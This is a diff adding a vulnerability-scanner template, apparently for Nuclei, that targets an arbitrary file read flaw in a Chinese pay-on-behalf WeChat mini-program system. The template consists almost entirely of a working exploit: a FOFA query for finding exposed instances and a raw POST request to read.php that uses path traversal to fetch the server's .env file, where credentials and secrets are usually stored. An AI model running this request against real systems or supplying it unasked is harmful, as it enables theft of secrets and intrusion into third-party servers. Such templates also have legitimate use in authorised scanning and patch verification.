@@ -1,0 +1,42 @@
+id: poc-ke1d07q6srbdiqcm
+info:
+  name: A2425美团代付三合一微信小程序系统read.php前台任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ke1d07q6srbdiqcm'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ke1d07q6srbdiqcm
+    fofa: '"/h5/static/js/chunk-vendors.js"'
+http:
+- raw:
+  - 'POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
+
+    sec-ch-ua-mobile: ?0
+
+    sec-ch-ua-platform: "Windows"Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9Connection: close
+
+    Content-Length: 27
+
+
+    name=../../../../../../.env'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
